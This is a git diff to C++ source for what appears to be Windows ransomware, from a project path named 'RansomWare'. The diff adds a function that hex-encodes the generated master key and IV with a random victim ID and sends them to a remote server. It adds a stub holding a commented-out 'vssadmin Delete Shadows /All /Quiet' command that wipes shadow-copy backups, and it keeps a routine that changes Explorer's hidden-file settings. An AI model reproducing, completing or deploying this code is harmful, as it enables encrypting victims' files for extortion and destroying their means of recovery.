@@ -1,6 +1,8 @@
 #include "Encryption.h"
+#include <algorithm>
+#include <stdexcept>
 #ifdef ENC
-
+#if 1
 using namespace boost::filesystem;
 using std::string;
 
@@ -14,23 +16,20 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 
 
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
+Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey);
+void changeHiddenFileState(bool state);
+void destroyVSS();
 
-void changeHiddenFileState(bool state)
-{
-	SHELLSTATE ss;
-	ZeroMemory(&ss, sizeof(ss));
-	ss.fShowAllObjects = state;
-	ss.fShowSysFiles = state;
-	ss.fShowSuperHidden = state;
-	SHGetSetSettings(&ss, SSF_SHOWALLOBJECTS | SSF_SHOWSYSFILES | SSF_SHOWSUPERHIDDEN, TRUE);
-}
 
 
 int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 	PBYTE masterIV, masterKey;
-	DWORD status = generateKeyAndIV(&masterIV, &masterKey);
-
+	Status status = generateKeyAndIV(&masterIV, &masterKey);
+	//TODO Check STATUS
+	status = sendIVAndKeyToServer(masterIV,masterKey);
+	//TODO Check STATUS
+//	destroyVSS();
 	changeHiddenFileState(false);
 	string pathToMasters = R"(C:\Programming\RansomWare\236499\Squanched\DebugKEY-IV.txt)";
 	std::ofstream masterKeyIVFile;
@@ -65,6 +64,88 @@ int main(int argc, char* argv[]) {
 	return 0;
 }
 
+std::string string_to_hex(const std::string& input)
+{
+	static const char* const lut = "0123456789ABCDEF";
+	size_t len = input.length();
+
+	std::string output;
+	output.reserve(2 * len);
+	for (size_t i = 0; i < len; ++i)
+	{
+		const unsigned char c = input[i];
+		output.push_back(lut[c >> 4]);
+		output.push_back(lut[c & 15]);
+	}
+	return output;
+}
+
+
+
+std::string hex_to_string(const std::string& input)
+{
+	static const char* const lut = "0123456789ABCDEF";
+	size_t len = input.length();
+	if (len & 1) throw std::invalid_argument("odd length");
+
+	std::string output;
+	output.reserve(len / 2);
+	for (size_t i = 0; i < len; i += 2)
+	{
+		char a = input[i];
+		const char* p = std::lower_bound(lut, lut + 16, a);
+		if (*p != a) throw std::invalid_argument("not a hex digit");
+
+		char b = input[i + 1];
+		const char* q = std::lower_bound(lut, lut + 16, b);
+		if (*q != b) throw std::invalid_argument("not a hex digit");
+
+		output.push_back(((p - lut) << 4) | (q - lut));
+	}
+	return output;
+}
+
+Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey)
+{
+	PBYTE id = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ID_LEN);
+	if (NULL == id) {
+		//TODO handle error
+	}
+
+	DWORD status;
+	status = BCryptGenRandom(NULL, id, ID_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+	string strID;
+	strID.assign((char*)id, ID_LEN);
+	strID = string_to_hex(strID);
+	string strMasterIV;
+	strMasterIV.assign((char*)masterIV, IV_LEN);
+	strMasterIV = string_to_hex(strMasterIV);
+	string strMasterKey;
+	strMasterKey.assign((char*)masterKey, KEY_LEN);
+	strMasterKey = string_to_hex(strMasterKey);
+	string str = "ID=";
+	str += strID + "&&";
+	str += "IV=" + strMasterIV + "&&";
+	str += "key=" + strMasterKey;
+	status = SendToServer(str);
+
+	HeapFree(GetProcessHeap(), 0, id);
+	return status;
+}
+
+void destroyVSS()
+{
+	//ShellExecute(nullptr, "open", "C:\\Windows\\system32\\vssadmin.exe Delete Shadows /All /Quiet", nullptr, nullptr, 0);
+}
+void changeHiddenFileState(bool state)
+{
+	SHELLSTATE ss;
+	ZeroMemory(&ss, sizeof(ss));
+	ss.fShowAllObjects = state;
+	ss.fShowSysFiles = state;
+	ss.fShowSuperHidden = state;
+	SHGetSetSettings(&ss, SSF_SHOWALLOBJECTS | SSF_SHOWSYSFILES | SSF_SHOWSUPERHIDDEN, TRUE);
+}
 DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE masterIV)
 {
 	DWORD status;
@@ -308,4 +389,5 @@ CLEANUP:
 //void send() {
 //
 //}
+#endif
 #endif
